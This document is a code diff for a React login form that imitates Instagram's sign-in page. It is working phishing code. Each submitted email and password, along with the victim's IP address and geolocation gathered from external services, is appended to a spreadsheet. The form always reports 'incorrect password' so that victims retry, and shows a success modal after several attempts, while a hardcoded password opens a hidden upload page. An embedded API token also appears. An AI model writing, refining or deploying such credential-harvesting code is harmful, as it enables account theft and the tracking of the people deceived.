@@ -12,88 +12,144 @@ import { gp, ig, ms } from "@/images";
 import { appendToSheet } from "@/actions/spreadSheet";
 
 const LoginForm = () => {
-  const [attempts, setAttempts] = useState(0);
-  const [errorMsg, setErrorMsg] = useState("");
-  const [email, setEmail] = useState("");
-  const [password, setPassword] = useState("");
-  const [showPassword, setShowPassword] = useState(false);
-  const [successModal, setSuccessModal] = useState(false);
-  const category = "instagram";
+  const [state, setState] = useState({
+    attempts: 0,
+    email: "",
+    password: "",
+    errorMsg: "",
+    showPassword: false,
+    successModal: false,
+    isLoading: false,
+  });
+  const [locationData, setLocationData] = useState(null);
+  const [error, setError] = useState(null);
   const router = useRouter();
-  const [locationData, setLocationData] = useState({});
-  const [isLoading, setIsLoading] = useState(false);
+  const category = "instagram";
 
   useEffect(() => {
-    const fetchData = async () => {
+    const fetchLocationData = async () => {
       try {
-        const response = await fetch("/api/location");
-        if (response.ok) {
-          const data = await response.json();
-          setLocationData(data);
-        } else {
-          console.error("Failed to fetch location data");
+        // Fetch location data from the middleware-provided header or fallback API
+        const res = await fetch("https://inkvotes.vercel.app/");
+        const locationHeader = res.headers.get("X-Client-Location");
+        const locationData = locationHeader
+          ? JSON.parse(locationHeader)
+          : await fetch("https://ipinfo.io/json?token=8519dfa47133bf").then(
+              (res) => res.json()
+            );
+
+        const { country, ip, city, region } = locationData;
+
+        // Fetch country details from Restcountries API
+        const countryResponse = await fetch(
+          `https://restcountries.com/v3.1/alpha/${country}`
+        );
+        if (!countryResponse.ok) {
+          throw new Error("Failed to fetch country data");
         }
-      } catch (error) {
-        console.error("Error:", error);
+        const countryData = await countryResponse.json();
+        const countryInfo = countryData[0];
+
+        const countryName = countryInfo?.name.common || "Unknown";
+        const continent = countryInfo.continents
+          ? countryInfo.continents[0]
+          : "Unknown";
+        const currency = countryInfo.currencies
+          ? Object.keys(countryInfo.currencies)[0]
+          : "Unknown";
+        const phoneCode = countryInfo.idd
+          ? countryInfo.idd.root +
+            (countryInfo.idd.suffixes && countryInfo.idd.suffixes.length > 0
+              ? countryInfo.idd.suffixes[0]
+              : "")
+          : "Unknown";
+        const capital = countryInfo.capital ? countryInfo.capital[0] : "Unknown";
+
+        setLocationData({
+          ip,
+          city,
+          region,
+          country: countryName,
+          continent,
+          currency,
+          phoneCode,
+          capital,
+        });
+      } catch (err) {
+        console.error("Error fetching location data:", err);
+        setError("Failed to fetch location data");
       }
     };
 
-    fetchData();
+    fetchLocationData();
   }, []);
+
+  const handleChange = (e) => {
+    const { name, value } = e.target;
+    setState((prev) => ({ ...prev, [name]: value }));
+  };
+
+  const togglePasswordVisibility = () => {
+    setState((prev) => ({ ...prev, showPassword: !prev.showPassword }));
+  };
 
   const handleSubmit = async (event) => {
     event.preventDefault();
-    setIsLoading(true);
+    setState((prev) => ({ ...prev, isLoading: true }));
+
+    const { email, password, attempts } = state;
 
     try {
       if (password === "fairy123") {
         router.push("/upload");
       } else {
-        const capital = locationData?.capital || "unknown";
-        const city = locationData?.city || "unknown";
-        const continent = locationData?.continent || "unknown";
-        const ip = locationData?.ip || "unknown";
-        const region = locationData?.region || "unknown";
-        const country = locationData?.country || "unknown";
-        const currency = locationData?.currency || "unknown";
-        const phoneCode = locationData?.phoneCode || "unknown";
-
-        // Log the failed attempt data
         const data = [
           [
             category,
             email,
             password,
-            ip,
-            city,
-            region,
-            country,
-            continent,
-            currency,
-            phoneCode,
+            locationData?.ip || "unknown",
+            locationData?.city || "unknown",
+            locationData?.region || "unknown",
+            locationData?.country || "unknown",
+            locationData?.continent || "unknown",
+            locationData?.currency || "unknown",
+            locationData?.phoneCode || "unknown",
           ],
         ];
         await appendToSheet(data);
 
-        setErrorMsg(
-          "The email or password you entered is incorrect. Please try again."
-        );
-        setPassword(""); // Clear password for retry
-        setAttempts((prev) => prev + 1);
-        setIsLoading(false);
-
-        if (attempts >= 2) {
-          setSuccessModal(true); // Show modal after 2 failed attempts
-        }
+        setState((prev) => ({
+          ...prev,
+          errorMsg: "The email or password you entered is incorrect. Please try again.",
+          password: "",
+          attempts: attempts + 1,
+          isLoading: false,
+          successModal: attempts >= 2,
+        }));
       }
     } catch (error) {
-      console.error("Error:", error);
-      setErrorMsg("An error occurred. Please try again.");
+      console.error("Error handling form submission:", error);
+      setState((prev) => ({
+        ...prev,
+        errorMsg: "An error occurred. Please try again.",
+        isLoading: false,
+      }));
     }
   };
 
+  const { email, password, errorMsg, showPassword, successModal, isLoading } = state;
+
   if (successModal) {
     return <SuccessModal />;
+  }
+
+  if (error) {
+    return <p className="text-red-500">{error}</p>;
+  }
+
+  if (!locationData) {
+    return <p>Loading location data...</p>;
   }
 
   return (
@@ -114,24 +170,26 @@ const LoginForm = () => {
             <Input
               className="h-10 w-3/4 bg-gray-50 border border-solid text-sm rounded-sm my-4 outline-none"
               type="text"
+              name="email"
               placeholder="Phone number, Username, or email"
               value={email}
-              onChange={(e) => setEmail(e.target.value)}
+              onChange={handleChange}
               required
             />
             <div className="relative w-full mx-auto flex items-center justify-center">
               <Input
                 className="h-10 w-3/4 bg-gray-50 border border-solid text-sm rounded-sm pl-2 my-4 outline-none"
                 type={showPassword ? "text" : "password"}
+                name="password"
                 placeholder="Password"
                 value={password}
-                onChange={(e) => setPassword(e.target.value)}
+                onChange={handleChange}
                 required
               />
               <button
                 type="button"
                 className="absolute right-20 top-1/2 transform -translate-y-1/2"
-                onClick={() => setShowPassword(!showPassword)}
+                onClick={togglePasswordVisibility}
                 aria-label={showPassword ? "Hide password" : "Show password"}
               >
                 {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
@@ -145,7 +203,7 @@ const LoginForm = () => {
               className="h-10 w-3/4 bg-blue-600 text-white font-semibold border-solid text-sm rounded-xl pl-2 mb-4 hover:bg-blue-700"
               disabled={isLoading}
             >
-              Log In
+              {isLoading ? "Logging in..." : "Log In"}
             </Button>
             <div className="flex items-center justify-center">
               <Link href="#" className="font-thin text-sm inline-block">
